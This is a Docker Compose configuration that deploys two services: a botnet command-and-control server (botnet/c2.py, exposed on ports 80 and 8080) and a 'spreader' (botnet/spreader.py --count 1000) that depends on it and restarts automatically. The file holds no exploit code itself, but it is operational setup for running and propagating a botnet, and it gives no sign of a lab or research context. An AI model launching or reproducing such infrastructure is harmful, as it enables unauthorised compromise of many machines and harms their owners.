version: '3'
services:
  c2:
    build: .
    command: python3 botnet/c2.py
    ports:
      - "80:80"
      - "8080:8080"
    volumes:
      - .:/app
    working_dir: /app
    restart: unless-stopped
  spreader:
    build: .
    command: python3 -u botnet/spreader.py --count 1000
    ports:
      - "8081:8080"
    volumes:
      - .:/app
    working_dir: /app
    depends_on:
      - c2
    restart: unless-stopped
